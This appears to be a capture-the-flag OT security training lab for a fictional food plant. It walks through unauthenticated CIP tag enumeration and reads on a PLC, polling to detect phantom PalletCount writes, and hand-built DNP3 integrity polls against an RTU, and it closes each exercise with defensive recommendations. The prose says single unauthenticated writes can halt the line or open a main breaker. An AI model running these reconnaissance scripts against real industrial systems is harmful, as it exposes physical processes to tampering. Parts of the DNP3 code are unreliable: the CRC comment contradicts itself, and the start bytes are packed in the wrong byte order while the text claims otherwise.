with LogixDriver("plc-packaging.masa.local", init_tags=False) as plc:
    flag = plc.read("FlagBlock")
    print("FlagBlock:", flag.value)
PYEOF
Expected output 
FlagBlock: OCR{...}

Copy the flag value and submit it in the OCR platform.

docs.title: Output Interpretation
docs.text:
• get_tag_list() returns a list of Tag descriptor objects. Each has .tag_name (string) and .type_info.data_type (integer CIP type code)
  • read() returns a Tag result object. Check .value for the decoded value and .error for any CIP error string
  • If read() returns None for value and a non-empty .error, the PLC rejected the read. Verify you are connected to the correct host
  • INT and DINT values are live process data and will change between reads. STRING values (SerialNumber, FlagBlock) are static

docs.title: Analysis Questions
docs.text:
1. CIP addresses tags by name. How does that change the threat model compared to Modbus register numbers?

Reveal answer

Modbus register numbers are meaningless without documentation. An attacker who reads register 40001 sees a raw integer and must guess what it controls. CIP tag names like ConveyorSpeed and LabelerState are self-documenting. An attacker on the OT LAN can enumerate the entire process model without any prior knowledge. The risk of targeted manipulation is significantly higher because the attacker does not need a register map.

2. The PLC returned 9 tags in Exercise 5.1. In a real ControlLogix, how many tags might a production program expose?

Reveal answer

A production ControlLogix program can expose hundreds to thousands of tags. Large process lines commonly have 500 to 2000 tags covering motors, valves, sensors, alarms, PID loops, and diagnostic counters. A single get_tag_list() call returns all of them. Segmenting the OT network to prevent unauthorized hosts from reaching TCP/44818 is the primary mitigation.

3. Exercise 5.1 used init_tags=False when constructing the LogixDriver. What would happen without that flag?

Reveal answer

Without init_tags=False, LogixDriver calls get_tag_list() and reads every tag automatically during connection setup. For a 9-tag simulator that is harmless. On a production PLC with thousands of tags, the automatic bulk read generates significant CIP traffic that could trip an IDS or slow the PLC's communication processor. Setting init_tags=False gives the assessor explicit control over what traffic is generated and when.

4. EtherNet/IP uses TCP/44818 for explicit messaging. What is implicit messaging and why does it matter for security?

Reveal answer

Implicit messaging uses UDP/2222 for cyclic I/O data exchange between a PLC and its I/O modules. Implicit messages are connectionless, high-frequency, and carry real-time control data. An attacker who can inject UDP/2222 frames can manipulate I/O values without ever opening a CIP session on TCP/44818. Firewall rules that block only TCP/44818 leave implicit messaging wide open. A complete defense must filter both TCP/44818 and UDP/2222.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation Packaging PLC answers unauthenticated CIP reads from any host on the OT LAN High Restrict TCP/44818 access to the engineering workstation VLAN using firewall rules or the ControlLogix Trusted Slot feature Tag names expose the entire process model to any CIP client Medium Enable CIP Security (TLS identity and integrity) on the ControlLogix firmware to authenticate clients before tag enumeration No EtherNet/IP IDS signatures on the Plant 3 segment Medium Deploy Snort or Zeek with EtherNet/IP and CIP dissectors, baseline normal tag-read patterns, and alert on enumeration bursts FlagBlock contains a static credential stored as a cleartext STRING tag Low Move commissioning certificates to the asset management system, not inside PLC memory

docs.title: Key Takeaways
docs.text:
• CIP rides on EtherNet/IP over TCP/44818. pycomm3 handles session registration and Forward Open framing so you can focus on tags
  • CIP addresses tags by name, not by register number. A single get_tag_list() call exposes the entire process data dictionary
  • Allen-Bradley ControlLogix PLCs expose INT, DINT, and STRING tags. Reading them requires no authentication by default
  • Nine tags on a simulator is small. Production PLCs expose hundreds of tags, making network segmentation the critical first defense
  • The init_tags=False pattern gives you explicit control over CIP traffic volume during an assessment

docs.title: Engagement Status
docs.text:
Client Masa Foods, Inc. (fictional) Role OT Security Engineer, Plant 3 Phase Discovery Protocol Literacy (CIP) Detection (unauthorized writes) Reporting

What you know so far: Exercise 5.1 gave you fluency in CIP tag enumeration and reads on the Plant 3 packaging PLC. You inventoried all nine tags and extracted the commissioning certificate. Reyna Alvarado has now received a complaint from the packaging floor supervisor: the pallet count on the HMI does not match the physical pallet count at the end of the line. Pallets appear in the system that were never built. Reyna suspects an unauthorized writer on the OT network and wants you to confirm or deny the anomaly using CIP reads only.

docs.title: Environment Checklist
docs.text:
Exercise 5.2 uses the same packaging PLC as Exercise 5.1. If you completed the environment setup in 5.1 (pycomm3 installed, plc-packaging.masa.local in /etc/hosts), verify connectivity and continue.

Kali

python3 -c "from pycomm3 import LogixDriver; print('pycomm3 ok')"
getent hosts plc-packaging.masa.local
nc -zv plc-packaging.masa.local 44818

All three must succeed. If any fail, return to the Environment Checklist in Exercise 5.1 and repeat the setup steps.

docs.title: Scenario
docs.text: The Plant 3 packaging floor supervisor has reported a discrepancy: the HMI shows 6 completed pallets, but the physical staging area holds only 4. The gap appeared overnight and has been growing. Reyna Alvarado suspects that something on the network is writing to the PalletCount tag without authorization. Your job is to monitor the tag over time, detect the unauthorized increments, and find the evidence that confirms the phantom source.

docs.title: Why this matters
docs.text:
Unauthorized tag writes are one of the most dangerous attacks on an ICS network. A write to a setpoint tag can change motor speed, valve position, or heater temperature. A write to a counter tag (like PalletCount) can corrupt production records, trigger false alarms, or mask real alarms. The technique you learn here, polling a tag at intervals and comparing values against the expected process rate, is the same technique SOC analysts use to detect unauthorized Modbus writes, S7 datablock modifications, and CIP tag tampering on production networks. Exercise 5.2 builds the detection muscle for CIP.

Credentials in scope Username Password Where it is used Plant 3 HMI (reference) plant_op masa_op_2025 Not used in this exercise

docs.title: The operator cockpit
docs.text:
The pallet-count complaint started on the operator cockpit, so it helps to see the screen the floor supervisor is reading. Open it in a browser at the address shown for ophmi-packaging in the Exercise Network panel (HTTP, port 80); from the in-lab Kali the name ophmi-packaging.masa.local also resolves. The cockpit animates the conveyor, labeler, box accumulator, and palletizer in real time and carries a live CIP traffic ticker, so the phantom PalletCount writes you are hunting land on the same display the supervisor watches.

Normal operation: the line runs at its conveyor setpoint and the pallet rate gauge tracks the physical process. The pallet total on this screen is the `PalletCount` CIP tag, the exact value the phantom injector is inflating.

Flip the cockpit into its Engineering view and every element is labelled with the live CIP tag behind it, so the palletizer reads PalletCount straight off the HMI. Seeing the tag bound to its element is what lets you tie a polled anomaly back to the physical asset the supervisor is questioning.

The Engineering X-ray binds each cockpit element to the live CIP tag that drives it and exposes the full packaging-line tag map as a register table. The `PalletCount` you poll in Stage 2 is the same tag this view ties to the palletizer.

docs.title: Objectives
docs.text:
• Read PalletCount twice with a 15-second interval between reads
  • Calculate the delta and determine whether the increment rate is consistent with the physical conveyor speed
  • Enumerate the tag list to find evidence of the phantom injector
  • Read the phantom evidence tag and submit the flag
Detail Value Difficulty Intermediate Estimated Time 20 to 30 minutes Prerequisites Exercise 5.1 (CIP basics) Flag Source Found? OCR{...} PhantomFlag tag (appears only during injection)

docs.title: Background: Detecting Unauthorized Writes via Polling
docs.text:
ICS protocols like Modbus, S7comm, and CIP do not natively log who wrote a value or when. The PLC stores only the current value of each tag. If two clients write to the same tag, the PLC applies both writes silently. There is no audit trail, no write log, no "last writer" field.

The detection approach is polling: read a tag at known intervals, record the values, and compare the observed rate of change against what the physical process should produce. If the value changes faster (or in a direction) that the process cannot explain, an unauthorized writer is active.

docs.title: Polling math for PalletCount
docs.text: The packaging line produces approximately 1 pallet for every 24 boxes. At a conveyor speed near 65%, the line produces roughly 1 box every 3 seconds, meaning 1 pallet every ~72 seconds. If PalletCount increments more than once in 15 seconds, the increment cannot come from the physical process alone.

docs.title: Tag list changes as evidence
docs.text: When an injector process connects to a CIP PLC, it may register additional tags or leave diagnostic markers. Comparing the tag list under normal conditions (9 tags from Exercise 5.1) against the tag list during the anomaly can reveal new tags that should not exist.

docs.title: Tools You Will Need
docs.text: Tool Purpose pycomm3 CIP/EtherNet/IP client library time.sleep() Introduce a 15-second polling interval

docs.title: Stage 1: Baseline PalletCount
docs.text:
Start by reading the current PalletCount value so you have a baseline. Record both the value and the timestamp so you can calculate the rate of change after the second read.

Kali

python3 - <<'PYEOF'
import time
from pycomm3 import LogixDriver

with LogixDriver("plc-packaging.masa.local", init_tags=False) as plc:
    r1 = plc.read("PalletCount")
    t1 = time.time()
    print(f"[{time.strftime('%H:%M:%S')}] PalletCount = {r1.value}")
PYEOF
Expected output 
[14:32:07] PalletCount = 12

The exact value depends on how long the simulation has been running. Record it.

docs.title: Stage 2: Poll and Compare
docs.text:
Read PalletCount twice with a 15-second gap between reads. The script calculates the delta and prints a verdict. At conveyor speed ~65%, the process should produce at most 1 pallet every ~72 seconds. Any increment of 1 or more in 15 seconds is suspicious because the process alone cannot produce a full pallet that quickly.

Kali

python3 - <<'PYEOF'
import time
from pycomm3 import LogixDriver

with LogixDriver("plc-packaging.masa.local", init_tags=False) as plc:
    r1 = plc.read("PalletCount")
    t1 = time.time()
    print(f"[{time.strftime('%H:%M:%S')}] PalletCount = {r1.value}")

    print("Waiting 15 seconds...")
    time.sleep(15)

    r2 = plc.read("PalletCount")
    t2 = time.time()
    print(f"[{time.strftime('%H:%M:%S')}] PalletCount = {r2.value}")

    delta = r2.value - r1.value
    elapsed = t2 - t1
    print(f"\nDelta: {delta} pallets in {elapsed:.1f} seconds")
    if delta >= 1:
        print("ANOMALY: PalletCount incremented faster than the process can produce pallets")
        print("An unauthorized writer is active on the CIP network")
    else:
        print("No anomaly detected in this interval")
PYEOF
Expected output 
[14:32:07] PalletCount = 12
Waiting 15 seconds...
[14:32:22] PalletCount = 13

Delta: 1 pallets in 15.0 seconds
ANOMALY: PalletCount incremented faster than the process can produce pallets
An unauthorized writer is active on the CIP network

The phantom injector writes to PalletCount approximately every 12 seconds, so a 15-second window should catch at least one phantom increment.

The injector here only inflates a counter, which corrupts records without halting the line. The same unauthenticated write path reaches control tags too. A single CIP write to LineState faults the whole packaging line, and the cockpit makes that consequence concrete:

One unauthenticated CIP write to `LineState` drops the cockpit to LINE FAULT and halts production. The phantom-pallet writer is the quiet version of the same exposure: any host on the OT LAN can write any tag by name, and counter tampering is only the least destructive outcome.

docs.title: Stage 3: Enumerate Tags for Evidence
docs.text:
Compare the current tag list against the 9 tags you found in Exercise 5.1. The phantom injector may have exposed a new tag that was not present during normal operation. Enumerate the full tag list and look for anything unexpected.

Kali

python3 - <<'PYEOF'
from pycomm3 import LogixDriver

BASELINE_TAGS = {
    "ConveyorSpeed", "ConveyorSetpoint", "BoxCount",
    "LabelerState", "PalletCount", "LineState",
    "ProductCode", "SerialNumber", "FlagBlock"
}

with LogixDriver("plc-packaging.masa.local", init_tags=False) as plc:
    tags = plc.get_tag_list()
    current = {t.tag_name for t in tags}
    new_tags = current - BASELINE_TAGS

    print(f"Total tags now: {len(tags)}")
    if new_tags:
        print(f"NEW tags not in baseline: {new_tags}")
        for name in new_tags:
            val = plc.read(name)
            print(f"  {name} = {val.value}")
    else:
        print("No new tags found")
PYEOF
Expected output 
Total tags now: 10
NEW tags not in baseline: {'PhantomFlag'}
  PhantomFlag = OCR{...}

The PhantomFlag tag only exists when the phantom injector is active. Reading its value gives you the flag.

docs.title: Stage 4: Submit the Flag
docs.text: Copy the value from PhantomFlag and submit it in the OCR platform.

docs.title: Output Interpretation
docs.text:
• A PalletCount delta of 1 or more in 15 seconds is anomalous. The physical process at ~65% conveyor speed needs approximately 72 seconds per pallet
  • A delta of 0 in a single 15-second window does not rule out an injector. The injector writes every ~12 seconds, so timing can occasionally cause a miss. Run the poll again if the first window shows no change
  • A 10th tag (PhantomFlag) in the tag list is direct evidence of the injector. Normal operation exposes exactly 9 tags
  • If you see only 9 tags, the exercise environment may not have started in injection mode. Verify the lab is running the correct exercise (5.2, not 5.1)

docs.title: Analysis Questions
docs.text:
1. The phantom injector writes PalletCount every 12 seconds. Could you detect it with a single read instead of two?

Reveal answer

A single read shows only the current value, not the rate of change. Without knowing the expected value (for example, from a historian or an independent physical count), a single read cannot distinguish a legitimate PalletCount of 15 from a phantom-inflated 15. Two reads at a known interval give you a rate, and the rate is what makes the anomaly visible.

2. In a production environment, what system would perform this polling automatically?

Reveal answer

An OT historian or a SCADA server polls tags on a configured schedule (typically 1 to 10 seconds for process data). An anomaly detection system sits downstream, comparing polled values against process models or statistical baselines. Commercial products include Claroty, Nozomi Networks, and Dragos Platform. The manual two-read technique in Exercise 5.2 replicates what those systems do at scale.

3. The PhantomFlag tag appeared in the tag list only during injection mode. Would a real attacker leave such obvious evidence?

Reveal answer

A real attacker would not create a new tag. Creating a tag requires engineering-level CIP access and would be immediately visible to anyone who enumerates the PLC. A real attacker would write to an existing tag (like PalletCount) using a standard CIP Write Tag service, leaving no tag-list fingerprint. The PhantomFlag tag exists in the simulator to give students a clear confirmation signal. In a real investigation, the only evidence would be the anomalous rate of change and, if network monitoring is active, the CIP Write packets from an unexpected source IP.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation PalletCount accepts writes from any CIP client on the OT LAN Critical Configure the ControlLogix to restrict write access to the HMI and engineering workstation only, using CIP Security or firewall rules on TCP/44818 No write-audit trail exists on the PLC High Deploy an OT network monitor (Claroty, Nozomi, Dragos) that logs all CIP Write Tag services and alerts on writes from non-baseline source IPs Phantom writes corrupt production records Medium Cross-validate PalletCount against the physical palletizer photoelectric sensor count in the historian, alerting when the two diverge by more than 1 Tag list enumeration is unrestricted Medium Enable CIP Security to require TLS client certificates before allowing tag-list reads

docs.title: Key Takeaways
docs.text:
• CIP PLCs do not log who wrote a tag value. Detection requires external polling and rate-of-change analysis
  • Reading a tag twice at a known interval and computing the delta is the simplest anomaly detection technique for ICS protocols
  • Comparing the current tag list against a known baseline can reveal injector artifacts, though real attackers would not leave new tags
  • The phantom injector demonstrates a write-based attack that corrupts production counters without triggering any PLC alarm
  • OT network monitoring that captures CIP Write Tag packets and correlates source IPs is the primary defense against unauthorized writes

docs.title: Why this matters
docs.text: DNP3 (Distributed Network Protocol version 3) is the dominant SCADA protocol in North American electric utilities, water systems, and oil/gas pipelines. Unlike Modbus (which has many Python libraries) or CIP (which has pycomm3), DNP3 client libraries for Python are uncommon in penetration testing toolkits. Real-world OT assessors frequently build raw DNP3 frames to test outstations. Exercise 5.3 forces you to understand the wire format: start bytes, link-layer header, CRC blocks, transport byte, and application layer. Building the frame by hand is the only way to internalize the protocol structure and recognize it in packet captures later.

docs.title: Background: DNP3 Wire Format
docs.text: DNP3 is a layered protocol designed for serial and TCP/IP SCADA links. The wire format has four layers, each nested inside the previous one.

docs.title: Data link layer
docs.text:
Every DNP3 frame begins with a 10-byte header:

Offset Size Field Value 0 2 bytes Start bytes 0x0564 (always) 2 1 byte Length Number of bytes after this field (payload + 5) 3 1 byte Control Direction and flow control flags 4 2 bytes Destination Outstation address (little-endian) 6 2 bytes Source Master address (little-endian) 8 2 bytes CRC CRC-DNP of the preceding 8 bytes

docs.title: CRC-DNP
docs.text:
DNP3 uses a CRC-16 variant called CRC-DNP. The algorithm:

  1. Initialize CRC to 0xFFFF
  2. For each byte: XOR the byte into the CRC
  3. For each of 8 bits: if bit 0 is set, shift right and XOR with 0xA6BC; otherwise shift right only
  4. After all bytes: XOR the final CRC with 0xFFFF

CRC blocks appear after the 8-byte header and after every 16 bytes of payload data.

docs.title: Transport layer
docs.text: A single byte immediately after the data link layer payload begins. Bit 7 (FIN) and bit 6 (FIR) indicate whether the fragment is the first, last, or only fragment. For a single-fragment message, the transport byte is 0xC0 OR'd with the sequence number.

docs.title: Application layer
docs.text: The application layer starts with a 1-byte function code and a 1-byte sequence number. For a Read request, the function code is 0x01. The request body contains object headers specifying what data to read. A Class 0 read requests Group 60 Variation 1 (all static data).

docs.title: Object addressing
docs.text:
DNP3 groups data by type:

Group Data type 1 Binary Input (static) 2 Binary Input Event 20 Counter (static) 30 Analog Input (static) 60 Class objects (60/1 = Class 0) 110 Octet String

A Class 0 integrity poll asks the outstation to return all static data: binary inputs, analog inputs, counters, and any octet strings.

docs.title: Tools You Will Need
docs.text: Tool Purpose Python socket Raw TCP connection to the outstation Python struct Pack and unpack binary DNP3 fields Wireshark Optional capture to verify frame structure

docs.title: Stage 1: Build the CRC Function
docs.text:
The CRC-DNP function is the foundation of every DNP3 frame. Write it first and test it against a known vector. The empty-input CRC should produce 0xFFFF (initial value XOR'd with 0xFFFF after zero iterations equals 0x0000, then XOR 0xFFFF gives 0xFFFF).

Kali

python3 - <<'PYEOF'
def crc16_dnp3(data):
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return crc ^ 0xFFFF

# Test: CRC of empty data should be 0x0000 ^ 0xFFFF = 0xFFFF... no,
# the loop does not run, so crc stays 0xFFFF, then XOR 0xFFFF = 0x0000
print(f"CRC of empty: 0x{crc16_dnp3(b''):04X}")
# Test with a known byte
print(f"CRC of 0x00:  0x{crc16_dnp3(b'\\x00'):04X}")
print("CRC function OK")
PYEOF
Expected output 
CRC of empty: 0x0000
CRC of 0x00:  0xE3A1
print CRC function OK

docs.title: Stage 2: Build and Send the Integrity Poll
docs.text:
Construct a DNP3 Class 0 Read request frame. The frame has three parts: the 10-byte link header (with CRC), the transport byte, and the application layer. The application layer contains a Read request (function code 0x01) with one object header requesting Group 60 Variation 1 (Class 0 data).

The request targets outstation address 10 from master address 1. The control byte 0x44 means: direction = master-to-outstation, primary message, no FCV/FCB.

Kali

python3 - <<'PYEOF'
import socket
import struct

DNP3_START = 0x0564
OUTSTATION = 10
MASTER = 1

def crc16_dnp3(data):
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return crc ^ 0xFFFF

def build_request():
    # Application layer: Read (0x01), sequence 0, Class 0 object header
    app_layer = bytes([
        0x01,       # function code: READ
        0x00,       # sequence number
        0x3C, 0x01, # Group 60, Variation 1 (Class 0)
        0x06,       # qualifier 0x06 = all objects, no range
    ])

    # Transport layer: FIR=1, FIN=1, seq=0 -> 0xC0
    transport = bytes([0xC0])
    payload = transport + app_layer

    # Data link header (8 bytes before CRC)
    length = len(payload) + 5
    header = struct.pack('<HBBHH', DNP3_START, length, 0x44, OUTSTATION, MASTER)
    header_crc = struct.pack('<H', crc16_dnp3(header))

    # Chunk the payload into 16-byte blocks, each followed by a CRC
    frame = header + header_crc
    pos = 0
    while pos < len(payload):
        chunk = payload[pos:pos + 16]
        pos += 16
        frame += chunk + struct.pack('<H', crc16_dnp3(chunk))

    return frame

# Connect and send
sock = socket.create_connection(('dnp3-rtu.masa.local', 20000), timeout=10)
request = build_request()
print(f"Sending {len(request)} byte request: {request.hex()}")
sock.sendall(request)

# Receive response (the outstation sends one frame)
response = b''
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    response += chunk
    # DNP3 frames are self-delimiting; wait for enough data
    if len(response) > 10:
        break

sock.close()
print(f"Received {len(response)} bytes: {response[:40].hex()}...")
PYEOF
Expected output 
Sending 15 byte request: 6405...
Received ... bytes: 6405...

The exact hex values depend on CRC calculations. Verify that you sent a frame starting with 0564 and received a frame starting with 0564.

docs.title: Stage 3: Parse the Response
docs.text:
The response frame contains the link header, transport byte, and application layer with all static data objects. Parse each layer to extract the breaker states, bus voltages, energy counters, and the flag string. The parsing must strip CRC bytes after every 16-byte chunk of payload data.

Kali

python3 - <<'PYEOF'
import socket
import struct

DNP3_START = 0x0564
OUTSTATION = 10
MASTER = 1

def crc16_dnp3(data):
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return crc ^ 0xFFFF

def build_request():
    app_layer = bytes([0x01, 0x00, 0x3C, 0x01, 0x06])
    transport = bytes([0xC0])
    payload = transport + app_layer
    length = len(payload) + 5
    header = struct.pack('<HBBHH', DNP3_START, length, 0x44, OUTSTATION, MASTER)
    header_crc = struct.pack('<H', crc16_dnp3(header))
    frame = header + header_crc
    pos = 0
    while pos < len(payload):
        chunk = payload[pos:pos + 16]
        pos += 16
        frame += chunk + struct.pack('<H', crc16_dnp3(chunk))
    return frame

def strip_crc_chunks(data, total_payload_len):
    """Remove CRC bytes from DNP3 payload chunks."""
    result = b''
    remaining = total_payload_len
    pos = 0
    while remaining > 0:
        chunk_size = min(16, remaining)
        if pos + chunk_size + 2 > len(data):
            break
        result += data[pos:pos + chunk_size]
        pos += chunk_size + 2   # skip 2-byte CRC
        remaining -= chunk_size
    return result

def parse_response(raw):
    if len(raw) < 10:
        print("Response too short")
        return

    start, length, ctrl, dst, src = struct.unpack_from('<HBBHH', raw, 0)
    if start != DNP3_START:
        print(f"Bad start bytes: 0x{start:04X}")
        return

    total_payload = length - 5
    payload_with_crc = raw[10:]
    payload = strip_crc_chunks(payload_with_crc, total_payload)

    # Transport byte
    transport = payload[0]
    app_data = payload[1:]

    # Application header: function code, sequence, IIN (2 bytes)
    if len(app_data) < 4:
        print("Application layer too short")
        return
    fc = app_data[0]
    seq = app_data[1]
    iin = struct.unpack_from('<H', app_data, 2)[0]
    print(f"Response FC=0x{fc:02X}  seq={seq}  IIN=0x{iin:04X}")
    print()

    # Parse object headers
    pos = 4
    while pos < len(app_data):
        if pos + 4 > len(app_data):
            break
        group = app_data[pos]
        variation = app_data[pos + 1]
        qualifier = app_data[pos + 2]
        count = app_data[pos + 3]
        pos += 4

        # Range field (qualifier 0x01 = 1-byte start/stop index)
        start_idx = 0
        stop_idx = 0
        if qualifier == 0x01:
            if pos + 2 > len(app_data):
                break
            start_idx = app_data[pos]
            stop_idx = app_data[pos + 1]
            pos += 2
            point_count = stop_idx - start_idx + 1
        else:
            point_count = count

        print(f"Group {group}, Variation {variation}, Qualifier 0x{qualifier:02X}, Count {point_count}")

        if group == 1 and variation == 2:
            # Binary inputs, packed format
            if pos < len(app_data):
                packed = app_data[pos]
                pos += 1
                for i in range(point_count):
                    state = (packed >> i) & 1
                    label = "CLOSED" if state else "OPEN"
                    print(f"  Breaker {start_idx + i}: {label}")
            print()

        elif group == 30 and variation == 1:
            # Analog inputs: flag(1) + value(4) per point
            for i in range(point_count):
                if pos + 5 > len(app_data):
                    break
                flag = app_data[pos]
                value = struct.unpack_from('<i', app_data, pos + 1)[0]
                voltage = value / 100.0
                pos += 5
                print(f"  Bus {start_idx + i}: {voltage:.1f} V")
            print()

        elif group == 20 and variation == 1:
            # Counters: flag(1) + value(4) per point
            for i in range(point_count):
                if pos + 5 > len(app_data):
                    break
                flag = app_data[pos]
                value = struct.unpack_from('<I', app_data, pos + 1)[0]
                pos += 5
                print(f"  Meter {start_idx + i}: {value} kWh")
            print()

        elif group == 110:
            # Octet string: variation = length of string
            str_len = variation
            if pos < len(app_data):
                octets = app_data[pos:pos + str_len]
                pos += str_len
                text = octets.decode("ascii", errors="replace")
                print(f"  Octet string: {text}")
            print()

        else:
            print(f"  (skipping unknown group {group})")
            break

# Send and receive
sock = socket.create_connection(('dnp3-rtu.masa.local', 20000), timeout=10)
sock.sendall(build_request())
response = b''
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    response += chunk
    if len(response) > 10:
        break
sock.close()

parse_response(response)
PYEOF
Expected output 
Response FC=0x81  seq=0  IIN=0x0000

Group 1, Variation 2, Qualifier 0x01, Count 4
  Breaker 0: CLOSED
  Breaker 1: CLOSED
  Breaker 2: OPEN
  Breaker 3: CLOSED

Group 30, Variation 1, Qualifier 0x01, Count 4
  Bus 0: 479.8 V
  Bus 1: 480.3 V
  Bus 2: 0.0 V
  Bus 3: 481.1 V

Group 20, Variation 1, Qualifier 0x01, Count 2
  Meter 0: 1247689 kWh
  Meter 1: 983445 kWh

Group 110, Variation 32, Qualifier 0x01, Count 1
  Octet string: OCR{...}

Bus voltages fluctuate slightly with each poll, and counter values increase over time. Breaker 2 is open, so Bus 2 reads 0.0 V. The Group 110 octet string contains your flag.

The reverse of that read is a group 12 CROB write, and the cockpit faceplate exposes exactly one: open the main breaker. The same DNP3 outstation that answers your unauthenticated integrity poll also accepts an unauthenticated control. When BI0 flips to open, the main bus de-energizes, the warehouse feeder drops, and the operator cockpit goes dark across the whole single-line.

The moment the main breaker (BI0) is opened over DNP3: the single-line drops to the LOAD SHED banner, the main and warehouse buses fall to 0 V, and the load-shed alarms fire. A single unauthenticated group 12 CROB on TCP/20000 takes the warehouse dark, the control-plane mirror of the read you ran in Stage 3.

docs.title: Stage 4: Submit the Flag
docs.text: Copy the octet string value from the Group 110 output and submit it in the OCR platform.

docs.title: Output Interpretation
docs.text:
• Response function code 0x81 is a normal response. 0x82 would be an unsolicited response (not expected here)
  • IIN (Internal Indications) of 0x0000 means no errors and no events pending
  • Breaker 2 is open by design. Bus 2 voltage reads 0.0 V because an open breaker de-energizes its bus
  • Analog values are stored as integers scaled by 100. Divide by 100 to get volts
  • Counters are unsigned 32-bit integers representing cumulative kWh
  • The Group 110 octet string length equals the variation number. A variation of 32 means 32 ASCII bytes

docs.title: Analysis Questions
docs.text:
1. DNP3 uses CRC-DNP after the header and after every 16 bytes of payload. Why so many CRC blocks?

Reveal answer

DNP3 was designed for noisy serial links (RS-232, RS-485) where bit errors are common. Placing a CRC every 16 bytes limits the blast radius of corruption: a single bit error invalidates only one 16-byte chunk, not the entire frame. The receiver can detect exactly which chunk failed. TCP provides its own checksum, so the DNP3 CRCs are redundant over TCP, but the wire format was preserved to keep the protocol identical on serial and TCP transports.

2. The integrity poll returned breaker states, voltages, counters, and an octet string. How does the outstation decide what to include?

Reveal answer

A Class 0 read (Group 60, Variation 1) asks for all static data. The outstation iterates through every configured data group and includes the current value of each point. The outstation decides which groups to include based on its configuration. Binary inputs, analog inputs, and counters are standard. The octet string (Group 110) is a vendor-specific data group that the outstation operator configured for the commissioning certificate. The outstation configuration determines the response content, not the master's request.

3. The script used master address 1 and outstation address 10. What would happen if the master address were wrong?

Reveal answer

The outstation checks the destination address in the incoming frame against its own configured address (10). If the destination matches, the outstation processes the request regardless of the source address. However, the outstation echoes the source address back as the destination in the response. If the master address were wrong (say 99 instead of 1), the response frame would be addressed to master 99. A strict master implementation that checks the destination address in responses would reject the frame. The Plant 3 simulator does not validate the source address, matching real-world outstation behavior where source address filtering is typically disabled by default.

4. Could an attacker replay a captured integrity poll request to read the outstation without understanding the protocol?

Reveal answer

Yes. DNP3 has no authentication by default. An attacker who captures a valid Class 0 Read frame can replay it byte-for-byte and receive a fresh response with current data. DNP3 Secure Authentication (SA, defined in IEEE 1815-2012) adds HMAC-based challenge-response to prevent replay, but most deployed outstations do not enable it. The Plant 3 RTU has no authentication configured.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation DNP3 outstation answers unauthenticated reads from any TCP client High Enable DNP3 Secure Authentication (SA) on the outstation and configure HMAC keys for each authorized master Breaker states and bus voltages are readable by any host on the OT LAN Medium Restrict TCP/20000 access to the SCADA master VLAN using firewall rules No DNP3-aware IDS on the Plant 3 warehouse segment Medium Deploy Zeek with the DNP3 analyzer module and baseline normal polling patterns Commissioning flag stored as a Group 110 octet string is accessible to any poller Low Move commissioning metadata out of the outstation data map and into the asset management system

docs.title: Key Takeaways
docs.text:
• DNP3 frames start with 0x0564, carry a CRC after the 8-byte header and after every 16 bytes of payload data
  • A Class 0 integrity poll (Group 60, Variation 1) returns all static data: binary inputs, analog inputs, counters, and octet strings
  • DNP3 addresses are 16-bit integers. The Plant 3 outstation lives at address 10, and the master address is 1
  • Building DNP3 frames by hand with raw sockets is a core OT assessment skill because Python DNP3 client libraries are uncommon in pentest toolkits
  • DNP3 has no authentication by default. Secure Authentication (SA) exists in the standard but is rarely deployed

docs.title: Background: Multi-Protocol Asset Inventory
docs.text:
An OT asset inventory maps every addressable data point on a network segment. For Plant 3, the inventory covers two protocols:

Target Protocol Port Data points plc-packaging.masa.local CIP / EtherNet/IP TCP/44818 Tags (named, typed) dnp3-rtu.masa.local DNP3 TCP/20000 Binary inputs, analog inputs, counters

The CIP tag count comes from get_tag_list(). The DNP3 binary input count comes from the Group 1 object header in the integrity poll response. Both counts must be exact integers.

docs.title: Flag format
docs.text:
The flag encodes both counts:

OCR{plant3_cip<N>_dnp3_<M>}

Replace <N> with the number of CIP tags and <M> with the number of DNP3 binary inputs. For example, if the PLC exposed 5 tags and the RTU reported 3 binary inputs, the flag would be OCR{________}.

docs.title: Suggested Methodology
docs.text: Exercise 5.4 is an independent exercise. No step-by-step walkthrough is provided. Instead, here are the stages a methodical assessor would follow. You may execute them in any order.

docs.title: Stage 1: CIP Tag Enumeration
docs.text: Connect to the packaging PLC with LogixDriver, call get_tag_list(), and count the tags. Record each tag name and type for the asset report.

docs.title: Stage 2: DNP3 Integrity Poll
docs.text: Connect to the warehouse RTU on TCP/20000, build a Class 0 Read frame (reuse the code from Exercise 5.3), send it, parse the response, and count the binary input points from the Group 1 object header.

• The CIP tag count should match what you found in Exercise 5.1. If the count differs, check whether the exercise is running in normal mode (not phantom mode from Exercise 5.2)
  • The DNP3 binary input count comes from the Group 1 object header's range or count field. Count only binary inputs (Group 1), not analog inputs (Group 30) or counters (Group 20)
